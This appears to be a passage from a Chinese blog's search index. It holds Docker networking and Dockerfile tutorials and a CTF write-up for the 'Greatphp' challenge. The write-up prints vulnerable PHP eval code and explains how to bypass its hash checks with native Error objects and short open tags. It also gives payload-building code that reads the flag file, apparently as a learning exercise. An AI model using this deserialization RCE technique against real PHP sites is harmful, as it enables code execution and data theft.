less-401","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://m0th.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://m0th.top/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"docker从入门到精通(五)","slug":"docker从入门到精通-五","date":"2021-01-13T14:55:54.000Z","updated":"2021-03-26T09:45:19.875Z","comments":true,"path":"2021/01/13/docker从入门到精通-五/","link":"","permalink":"http://m0th.top/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/","excerpt":"深层次学习docker，docker网络","text":"深层次学习docker，docker网络 docker网络理解Docker0清空所有环境，查看网络配置 测试 12345678910111213141516[root@iz2zeg4zg69ldanw7ftdhez ~]# docker rm -f $(docker ps -aq)2559b0597e1c[root@iz2zeg4zg69ldanw7ftdhez ~]# ip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 00:16:3e:03:cd:f3 brd ff:ff:ff:ff:ff:ff inet 172.24.11.56/18 brd 172.24.63.255 scope global dynamic eth0 valid_lft 315230835sec preferred_lft 315230835sec3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN link/ether 02:42:ff:51:d9:f0 brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 valid_lft forever preferred_lft forever 共有三个网络 1#问题： docker是如何处理容器网络访问的 1234567891011121314151617181920[root@iz2zeg4zg69ldanw7ftdhez ~]# docker run -d -P --name tomcat01 tomcat#查看容器的内部网络地址 ip addr ，发现容器有一个 eth0@if11的网卡，这是docker分配的[root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat01 ip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever10: eth0@if11: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever#此时 linux服务器可以直接ping通docker容器[root@iz2zeg4zg69ldanw7ftdhez ~]# ping 172.17.0.2PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.059 ms64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.050 ms64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.050 ms64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.050 ms 原理 我们每启动一个docker容器，docker就会给docker容器分配一个ip，我们只要安装了docker，就会有一个网卡docker0 桥接模式，使用的技术是 evth-pair技术 再次测试linux服务器的ip 1[root@iz2zeg4zg69ldanw7ftdhez ~]# ip addr 再启动一个容器，查看ip 123456789101112131415161718[root@iz2zeg4zg69ldanw7ftdhez ~]# ip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 00:16:3e:03:cd:f3 brd ff:ff:ff:ff:ff:ff inet 172.24.11.56/18 brd 172.24.63.255 scope global dynamic eth0 valid_lft 315229578sec preferred_lft 315229578sec3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP link/ether 02:42:ff:51:d9:f0 brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 valid_lft forever preferred_lft forever11: veth2cdc73e@if10: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP link/ether 5a:d8:d7:7e:ec:f0 brd ff:ff:ff:ff:ff:ff link-netnsid 013: veth19f896c@if12: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP link/ether 46:c7:22:af:f9:26 brd ff:ff:ff:ff:ff:ff link-netnsid 1 我们发现又多了一个网卡 我们仔细观察，多的网卡其实是成对存在的 我们查看tomcat02容器的ip 123456789[root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat02 ip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever12: eth0@if13: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever 1234#我们发现这些容器带来的网卡都是一对一对的#evth-pair 就是一对的虚拟设备几口，他们都是成对出现的，一段连着协议，一段彼此相连#正因为这个特性，evth-pair 充当了一个桥梁，连接着各种虚拟网络设备#Openstac，Docker容器之间的连接，ovs的连接，都是使用evth-pair技术 我们来测试下tomcat01是否可以ping通tomcat02的ip 1234567891011121314 [root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat02 ip addr 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 12: eth0@if13: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever [root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat01 ping 172.17.0.3PING 172.17.0.3 (172.17.0.3) 56(84) bytes of data. 64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.083 ms64 bytes from 172.17.0.3: icmp_seq=2 ttl=64 time=0.073 ms 64 bytes from 172.17.0.3: icmp_seq=3 ttl=64 time=0.061 ms 123456789101112131415161718192021222324252627282930313233343536373839404142434445 绘制一幅docker网络模型图 ![image-20210113233634209](docker从入门到精通-五&#x2F;image-20210113233634209.png) 结论：tomcat01和tomcat02是公用的一个路由器，docker0 所有的容器不指定网络的情况下，都是docker0路由的，docker会给我们的容器分配一个任意的可用ip &gt; 小结 ​ Docker使用的是linux的桥接，宿主机中有一个docker容器的网桥 docker0 ![image-20210113234027074](docker从入门到精通-五&#x2F;image-20210113234027074.png) ​ docker中所有网络接口都是虚拟的，所以效率非常高！ 只要容器删除，对应的网卡就会删除 ![image-20210114094421014](docker从入门到精通-五&#x2F;image-20210114094421014.png) ### --link---&gt; 思考一个场景，我们编写了一个微服务，database url&#x3D;ip；项目不重启，数据库ip换掉了，我们希望可以处理这个问题，是否可以通过名字访问容器​&#96;&#96;&#96;shell[root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat02 ping tomcat01ping: tomcat01: Name or service not known#而然，通过--link就可以通过名字来访问[root@iz2zeg4zg69ldanw7ftdhez ~]# docker run -d -P --name tomcat03 --link tomcat02 tomcat9f18f11fee160157d9c539f9277bf84e173cde4929fda8cce0843c526b3b8f6b[root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat03 ping tomcat02PING tomcat02 (172.17.0.3) 56(84) bytes of data.64 bytes from tomcat02 (172.17.0.3): icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.084 ms64 bytes from tomcat02 (172.17.0.3): icmp_seq&#x3D;2 ttl&#x3D;64 time&#x3D;0.058 ms64 bytes from tomcat02 (172.17.0.3): icmp_seq&#x3D;3 ttl&#x3D;64 time&#x3D;0.061 ms64 bytes from tomcat02 (172.17.0.3): icmp_seq&#x3D;4 ttl&#x3D;64 time&#x3D;0.059 ms#tomcat03能够ping通tomcat02是否意味着tomcat02能够ping通tomcat03[root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat02 ping tomcat03ping: tomcat03: Name or service not known#答案是并不可以 探究：inspect 其实这个tomcat03 就是在本地配置了tomcat02的配置 12345678910# 查看 hosts 配置，在这里原理发现！[root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat03 cat /etc/hosts127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters172.17.0.3 tomcat02 8ddaead46e6d172.17.0.4 9f18f11fee16 –link 就是我们在hosts配置中增加了一个 172.17.0.3 tomcat02 8ddaead46e6d 我们现在玩Docker 已经不建议使用 –link了！ 自定义网络！不适用docker0！ docker0问题：他不支持容器名连接访问！ 自定义网络 查看所有的docker网络 网络模式 bridge：桥接 docker（默认） none：不配置网络 host：和宿主级共享网络 container：容器网络联通！（用的少！局限很大） 测试1234567891011121314151617 # 我们直接启动的命令 --net bridge，而这个就是我们的docker0[root@iz2zeg4zg69ldanw7ftdhez ~]# docker run -d -P --name tomcat01 --net bridge tomcat00673172fe3bcf4820070cb18149bbe43d9288d5320e6b3fce45de510155ee5f#和这个 docker run -d -P --name tomcat01 tomcat 一样#docker0 特点：默认，域名不能访问，--link之后可以打通连接！#我们可以自定义一个网络！# --driver bridge# --subnet 192.168.0.0/16 192.168.0.2~192.168.255.255# --gateway 192.168.0.1[root@iz2zeg4zg69ldanw7ftdhez ~]# docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynet81006dbc871debc46b8e531c41ad9be431d7150f7cb2f0a0db10ac07583cdd05[root@iz2zeg4zg69ldanw7ftdhez ~]# docker network lsNETWORK ID NAME DRIVER SCOPE4500a6cd34fa bridge bridge localdc323b7a20eb host host local81006dbc871d mynet bridge local8289f381d1ea none null local 我们自己的网络就创建好了 我们来测试一下自定义网络的效果 123456789101112[root@iz2zeg4zg69ldanw7ftdhez ~]# docker run -d -P --name tomcat-net-01 --net mynet tomcat9814d6248e8178a7a532bddd71c7fe2933778a1e9a9df79b09a31dae2b024971[root@iz2zeg4zg69ldanw7ftdhez ~]# [root@iz2zeg4zg69ldanw7ftdhez ~]# docker run -d -P --name tomcat-net-02 --net mynet tomcatee10fbc43978a4a6867e9226fa65e3b30597d98e553e3c5aa59986d9c667031c[root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec tomcat-net-01 ping tomcat-net-02PING tomcat-net-02 (192.168.0.3) 56(84) bytes of data.64 bytes from tomcat-net-02.mynet (192.168.0.3): icmp_seq=1 ttl=64 time=0.056 ms64 bytes from tomcat-net-02.mynet (192.168.0.3): icmp_seq=2 ttl=64 time=0.064 ms64 bytes from tomcat-net-02.mynet (192.168.0.3): icmp_seq=3 ttl=64 time=0.061 ms#测试ping连接发现，不使用--link也可以直接ping名字来ping通 我们自定义的网络docker都已经帮我们维护好了对应的关系，推荐我们平时这样使用网络！ 好处： redis- 不同的集群使用不同的网络，保证集群是安全和健康的 mysql-不同的集群使用不同的网络，保证集群是安全和健康的 网络连通 我们现在来解决一个这样的问题 123456789101112131415161718192021#01 连通[root@iz2zeg4zg69ldanw7ftdhez ~]# docker run -d -P --name tomcat01 tomcat2e9c44d7c622cbef589abfbb2365bcf0fe845a7383cff6dde466dea260513cd9[root@iz2zeg4zg69ldanw7ftdhez ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES2e9c44d7c622 tomcat &quot;catalina.sh run&quot; 7 seconds ago Up 6 seconds 0.0.0.0:49160-&gt;8080/tcp tomcat01ee10fbc43978 tomcat &quot;catalina.sh run&quot; 8 hours ago Up 8 hours 0.0.0.0:49159-&gt;8080/tcp tomcat-net-029814d6248e81 tomcat &quot;catalina.sh run&quot; 8 hours ago Up 8 hours 0.0.0.0:49158-&gt;8080/tcp tomcat-net-01[root@iz2zeg4zg69ldanw7ftdhez ~]# docker network connect mynet tomcat01 [root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat01 ping tomcat-net-01PING tomcat-net-01 (192.168.0.2) 56(84) bytes of data.64 bytes from tomcat-net-01.mynet (192.168.0.2): icmp_seq=1 ttl=64 time=0.062 ms64 bytes from tomcat-net-01.mynet (192.168.0.2): icmp_seq=2 ttl=64 time=0.054 ms64 bytes from tomcat-net-01.mynet (192.168.0.2): icmp_seq=3 ttl=64 time=0.062 ms#02 依旧连不通[root@iz2zeg4zg69ldanw7ftdhez ~]# docker run -d -P --name tomcat02 tomcat523e4e9c3fa37b4d5040e182621087089edb308bb47a8b4d5dd7860625786a48[root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat02 ping tomcat-net-01ping: tomcat-net-01: Name or service not known 结论：假设要跨网络操作别人，就需要使用docker network connect 连通！ 原理其实是相当于给tomcat01增添了一张网卡，即一容器双ip 实战：部署redis集群","categories":[{"name":"linux运维","slug":"linux运维","permalink":"http://m0th.top/categories/linux%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://m0th.top/tags/docker/"}]},{"title":"docker从入门到精通(四)","slug":"docker从入门到精通-四","date":"2021-01-13T10:10:39.000Z","updated":"2021-03-26T09:45:12.518Z","comments":true,"path":"2021/01/13/docker从入门到精通-四/","link":"","permalink":"http://m0th.top/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E5%9B%9B/","excerpt":"dockerfile构建","text":"dockerfile构建 Dockerfile Dockerfile介绍dockerfile 是用来构建docker镜像的文件！命令参数脚本！ 构建步骤： 编写一个dockerfile文件 docker build 构建成为一个镜像 docker run 运行镜像 docker push 发布镜像（Dockerhub、阿里云镜像仓库！） Dockerfile构建基础知识： 每个关键字（指令）都是必须是大写字母 执行顺序从上到下 #表示注释 每个指令会提交一个新的镜像层，并提交 dockerfile是面向开发的，发布项目，做镜像，就需要编写dockerfile文件 Docker镜像逐渐成为企业交付的标准，必须掌握 DockerFile:构建文件，定义了一切的步骤，源代码 DockerImages:通过DockerFile构建生成的镜像，最终发布和云行的产品！ Docker容器：容器就是镜像运行起来提供服务 DockerFile 123456789101112FROM #基础镜像，一起从此开始MAINTAINER #镜像是谁的，姓名+邮箱RUN #镜像构建的时候需要运行的命令ADD #步骤：tomcat镜像，这个tomcat压缩包！添加内容WORKDIR #镜像的工作目录VOLUME #挂载的目录EXPOSE #保留端口配置 CMD #指定这个容器启动的时候需要运行的命令，只有最后一个声响，可被代替ENTRYPOINT #指定这个容器启动的时候运行的命令，可以追加命令ONBUILD #当构建一个被继承 Dockerfile这个时候就会运行 ONBUILD的指令。触发COPY #类似ADD，将我们的文件拷贝到镜像中ENV #构建的时候设置环境变量 实战测试 centos官方dockerfile 1234FROM scratchADD centos-8-x86_64.tar.xz /LABEL org.label-schema.schema-version=&quot;1.0&quot; org.label-schema.name=&quot;CentOS Base Image&quot; org.label-schema.vendor=&quot;CentOS&quot; org.label-schema.license=&quot;GPLv2&quot; org.label-schema.build-date=&quot;20201204&quot;CMD [&quot;/bin/bash&quot;] 我们发现官方给镜像里面很多工具没有，例如vim 等，我们来自己构建一个dockerfile 1234567891011121314FROM centosMAINTAINER M0th&lt;1757186769@qq.com&gt;ENV MYPATH /usr/localWORKDIR $MYPATHRUN yum -y install vimRUN yum -y install net-toolsEXPOSE 80CMD echo $MYPATHCMD echo &quot;----end----&quot;CMD /bin/bash 12345678910111213141516171819202122232425262728293031323334353637383940414243[root@iZ8vbgt047thtwcw9p956rZ test]# cat mydockerfile FROM centosMAINTAINER M0th&lt;1757186769@11.com&gt;ENV MYPATH /usr/localWORKDIR $MYPATHRUN yum -y install vimRUN yum -y install net-toolsEXPOSE 80CMD echo $MYPATHCMD echo &quot;----end----&quot;CMD /bin/bash#2、通过文件构建镜像#命令 docker build -f dockerfile 文件路径 -t 镜像名:[tag]Successfully built 09722080dad6Successfully tagged mycentos:latest#3、测试运行[root@iZ8vbgt047thtwcw9p956rZ test]# docker run -it mycentos [root@26b20d819388 local]# lsbin etc games include lib lib64 libexec sbin share src[root@26b20d819388 local]# pwd/usr/local[root@26b20d819388 local]# vim test[root@26b20d819388 local]# ifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.17.0.4 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:ac:11:00:04 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 我们还可以通过history命令看镜像构建过程 1234567891011121314[root@iZ8vbgt047thtwcw9p956rZ test]# docker history mycentosIMAGE CREATED CREATED BY SIZE COMMENT09722080dad6 6 minutes ago /bin/sh -c #(nop) CMD [&quot;/bin/sh&quot; &quot;-c&quot; &quot;/bin… 0B 00d825fd5f9f 6 minutes ago /bin/sh -c #(nop) CMD [&quot;/bin/sh&quot; &quot;-c&quot; &quot;echo… 0B 616a7de62927 6 minutes ago /bin/sh -c #(nop) CMD [&quot;/bin/sh&quot; &quot;-c&quot; &quot;echo… 0B 38232d298601 6 minutes ago /bin/sh -c #(nop) EXPOSE 80 0B 79f3886fd670 6 minutes ago /bin/sh -c yum -y install net-tools 23.2MB cc0bab19e0d6 6 minutes ago /bin/sh -c yum -y install vim 57.7MB f55ce5bdb633 6 minutes ago /bin/sh -c #(nop) WORKDIR /usr/local 0B 8d2fe8dc59da 6 minutes ago /bin/sh -c #(nop) ENV MYPATH=/usr/local 0B e58dfb8f0b53 6 minutes ago /bin/sh -c #(nop) MAINTAINER M0th&lt;175718676… 0B 0d120b6ccaa8 4 months ago /bin/sh -c #(nop) CMD [&quot;/bin/bash&quot;] 0B &lt;missing&gt; 4 months ago /bin/sh -c #(nop) LABEL org.label-schema.sc… 0B &lt;missing&gt; 4 months ago /bin/sh -c #(nop) ADD file:538afc0c5c964ce0d… 215MB 那么平时我们拿到一个镜像，可以研究一下他是怎么做的了 CMD和ENTRYPOINT区别 12CMD #指定这个容器启动的时候要运行的命令，只有最后一个会生效，可被代替ENTRYPOINT #指定这个容器启动的时候要运行的命令,可以追加命令 测试cmd 123456789101112131415161718192021222324252627282930[root@iZ8vbgt047thtwcw9p956rZ test]# vim dockerfile-test-cmd[root@iZ8vbgt047thtwcw9p956rZ test]# cat dockerfile-test-cmd FROM centosCMD [&quot;ls&quot;,&quot;-a&quot;]#构建镜像[root@iZ8vbgt047thtwcw9p956rZ test]# docker build -f dockerfile-test-cmd -t testcmd .Sending build context to Docker daemon 4.096kBStep 1/2 : FROM centos ---&gt; 0d120b6ccaa8Step 2/2 : CMD [&quot;ls&quot;,&quot;-a&quot;] ---&gt; Running in 59bcf777596fRemoving intermediate container 59bcf777596f ---&gt; 7a64bf7d89eeSuccessfully built 7a64bf7d89eeSuccessfully tagged testcmd:latest#run运行，发现我们 ls -a命令可以执行 但是测试追加 l参数，ls -al并不可以执行[root@iZ8vbgt047thtwcw9p956rZ test]# docker run testcmd -ldocker: Error response from daemon: OCI runtime create failed: container_linux.go:349: starting container process caused &quot;exec: \\&quot;l\\&quot;: executable file not found in $PATH&quot;: unknown.[root@iZ8vbgt047thtwcw9p956rZ test]# docker run testcmd....dockerenvbindevetchomeliblib64lost+found#cmd下 -l 替换了CMD[&quot;ls&quot;,&quot;-a&quot;] 命令， -l不是命令所以并不执行 测试ENTRYPOINT 123456789101112131415161718192021222324252627282930313233343536373839[root@iZ8vbgt047thtwcw9p956rZ test]# vim dockerfile-test-entrypoint[root@iZ8vbgt047thtwcw9p956rZ test]# cat dockerfile-test-entrypoint FROM centosENTRYPOINT [&quot;ls&quot;,&quot;-a&quot;][root@iZ8vbgt047thtwcw9p956rZ test]# docker build -f dockerfile-test-entrypoint -t testentrypoint .Sending build context to Docker daemon 5.12kBStep 1/2 : FROM centos ---&gt; 0d120b6ccaa8Step 2/2 : ENTRYPOINT [&quot;ls&quot;,&quot;-a&quot;] ---&gt; Running in 0798fc1d09abRemoving intermediate container 0798fc1d09ab ---&gt; 51a72cfdbc4dSuccessfully built 51a72cfdbc4dSuccessfully tagged testentrypoint:latest[root@iZ8vbgt047thtwcw9p956rZ test]# docker run testentrypoint....dockerenvbindevetchomeliblib64lost+foundvar[root@iZ8vbgt047thtwcw9p956rZ test]# docker run testentrypoint -ltotal 56drwxr-xr-x 1 root root 4096 Dec 9 13:19 .drwxr-xr-x 1 root root 4096 Dec 9 13:19 ..-rwxr-xr-x 1 root root 0 Dec 9 13:19 .dockerenvlrwxrwxrwx 1 root root 7 May 11 2019 bin -&gt; usr/bindrwxr-xr-x 5 root root 340 Dec 9 13:19 devdrwxr-xr-x 1 root root 4096 Dec 9 13:19 etcdrwxr-xr-x 2 root root 4096 May 11 2019 homelrwxrwxrwx 1 root root 7 May 11 2019 lib -&gt; usr/liblrwxrwxrwx 1 root root 9 May 11 2019 lib64 -&gt; usr/lib64drwx------ 2 root root 4096 Aug 9 21:40 lost+found#run运行，发现我们 ls -a命令可以执行 但是测试追加 l参数，ls -al可以执行 实战:Tomcat镜像 准备镜像文件 tomcat 压缩包，jdk的压缩包！ 编写dockerfile文件 ，官方命名Dockerfile 123456789101112131415161718192021222324FROM centosMAINTAINER moth&lt;1757186769@qq.com&gt;COPY readme.txt /usr/local/readme.txtADD jdk-15.0.1_linux-x64_bin.tar.gz /usr/localADD apache-tomcat-9.0.41.tar.gz /usr/localRUN yum -y install vimENV MYPATH /usr/localWORKDIR /usr/localENV JAVA_HOME /usr/local/jdk-15.0.1ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarENV CATALINA_HOME /usr/local/apache-tomcat-9.0.41ENV CATALINA_BASH /usr/local/apache-tomcat-9.0.41ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/binEXPOSE 8080CMD /usr/local/apache-tomcat-9.0.41/bin/startup.sh &amp;&amp; tail -f /usr/local/apache-tomcat-9.0.41/logs/catalina.out 123docker build -t mytomcat .docker run -d -p 8080:8080 -v /root/tomcat/test:/usr/local/apache-tomcat-9.0.41/webapps/test -v /root/tomcat/tomcatlog:/usr/local/apache-tomcat-9.0.41/logs mytomcat 发布镜像 Dockerhub 有一个dockerhub账号 在服务器上提交我们的镜像 登入dockerhub 123456789101112131415161718[root@iz2zeg4zg69ldanw7ftdhez ~]# docker login --helpUsage: docker login [OPTIONS] [SERVER]Log in to a Docker registry.If no server is specified, the default is defined by the daemon.Options: -p, --password string Password --password-stdin Take the password from stdin -u, --username string Username[root@iz2zeg4zg69ldanw7ftdhez ~]# docker login -u moth404Password: WARNING! Your password will be stored unencrypted in /root/.docker/config.json.Configure a credential helper to remove this warning. Seehttps://docs.docker.com/engine/reference/commandline/login/#credentials-storeLogin Succeeded 4、登录完毕可以提交镜像，docker push 12345678#先改名 docker tag mycentos moth404/mycentos[root@iz2zeg4zg69ldanw7ftdhez dockertest]# docker push moth404/mUsing default tag: latestThe push refers to repository [docker.io/moth404/mycentos]cb098675aa0d: Layer already exists 6d7590ebcc50: Layer already exists 2653d992f4ef: Layer already exists latest: digest: sha256:3a7c792acf141aeae6e33391efa42a1ba1ae415f push到阿里云镜像服务上 登录阿里云 找到容器镜像服务 创建命名空间 创建容器镜像 推送 小结 123456789101112131415161718[root@iz2zeg4zg69ldanw7ftdhez dockertest]# docker save mycentos -o test[root@iz2zeg4zg69ldanw7ftdhez dockertest]# lsdockerfile test[root@iz2zeg4zg69ldanw7ftdhez dockertest]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEmoth404/mycentos latest 64de2c9d4641 4 hours ago 282MBcentos latest 300e315adb2f 5 weeks ago 209MBhello-world latest bf756fb1ae65 12 months ago 13.3kB[root@iz2zeg4zg69ldanw7ftdhez dockertest]# docker load -i testLoaded image: mycentos:latest[root@iz2zeg4zg69ldanw7ftdhez dockertest]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEmycentos latest 64de2c9d4641 4 hours ago 282MBmoth404/mycentos latest 64de2c9d4641 4 hours ago 282MBcentos latest 300e315adb2f 5 weeks ago 209MBhello-world latest bf756fb1ae65 12 months ago 13.3kB","categories":[{"name":"linux运维","slug":"linux运维","permalink":"http://m0th.top/categories/linux%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://m0th.top/tags/docker/"}]},{"title":"[极客大挑战2020]Greatphp","slug":"2020-Greatphp","date":"2021-01-08T06:49:37.000Z","updated":"2021-01-14T10:13:03.312Z","comments":true,"path":"2021/01/08/2020-Greatphp/","link":"","permalink":"http://m0th.top/2021/01/08/2020-Greatphp/","excerpt":"一个很有意思的绕过 trick","text":"一个很有意思的绕过 trick 0x01 源码分析12345678910111213141516171819202122232425&lt;?phperror_reporting(0);class SYCLOVER &#123; public $syc; public $lover; public function __wakeup()&#123; if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123; if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123; eval($this-&gt;syc); &#125; else &#123; die(&quot;Try Hard !!&quot;); &#125; &#125; &#125;&#125;if (isset($_GET[&#x27;great&#x27;]))&#123; unserialize($_GET[&#x27;great&#x27;]);&#125; else &#123; highlight_file(__FILE__);&#125;?&gt; eval 很明显的rce漏洞，代码逻辑也很简单 整体思路就是通过unserialize反序列化触发_wakeup 绕过if判断 eval执行代码 0x02 漏洞利用bypass hash1($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) 显然按照正常的思路我们可以通过0e的方式绕过，然而结合以下eval我们发现满足0e的字符串很难被当做php代码来执行 这里考了一个新的绕过hash的思路，即通过利用原生类，比如Error,Exception等进行绕过 md5/sha1可以对一个类进行hash,会触发一个类的__toString方法 我们可以通过以下方式绕过检测, 1$a=new Error($str,1);$b=new Error($str,2); #$a与$b不相等,但是hash后相等，且报错字符串在同一行（必须在同一行才能绕过） bypass “/&lt;?php|(|)|&quot;|&#39;/“不能以&lt;?php开头且 不能有小括号 以及单双引号 这里采用短开标签进行利用即 &lt;?= 与 &lt;?php echo等价 从而绕过了 &lt;?php的限制 最后可以构造 123456789101112131415161718192021class SYCLOVER &#123; public $syc; public $lover; public function __wakeup()&#123; if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123; if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;var1, $match))&#123; eval($this-&gt;syc); &#125; else &#123; die(&quot;Try Hard !!&quot;); &#125; &#125; &#125;&#125;echo 1213;$str=&quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;$a=new Error($str,1);$b=new Error($str,2);$c = new SYCLOVER();$c-&gt;syc = $a;$c-&gt;lover = $b;echo(urlencode(serialize($c))); 官方wp中的给的构造是 1$str1 = &quot;?&gt;&lt;?=include[~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;][!&quot;.urldecode(&quot;%FF&quot;).&quot;]?&gt;&quot;; 都可以","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"http://m0th.top/tags/ctf-web/"}]},{"title":"反序列化字符逃逸总结&&[安洵杯2019]easy_serialize_php","slug":"2019-easy-serialize-php","date":"2021-01-08T02:50:38.000Z","updated":"2021-01-31T16:25:32.409Z","comments":true,"path":"2021/01/08/2019-easy-serialize-php/","link":"","permalink":"http://m0th.top/2021/01/08/2019-easy-serialize-php/","excerpt":"基于这道题，总结反序列化漏洞的成因，类型，利用方式","text":"基于这道题，总结反序列化漏洞的成因，类型，利用方式 0x01 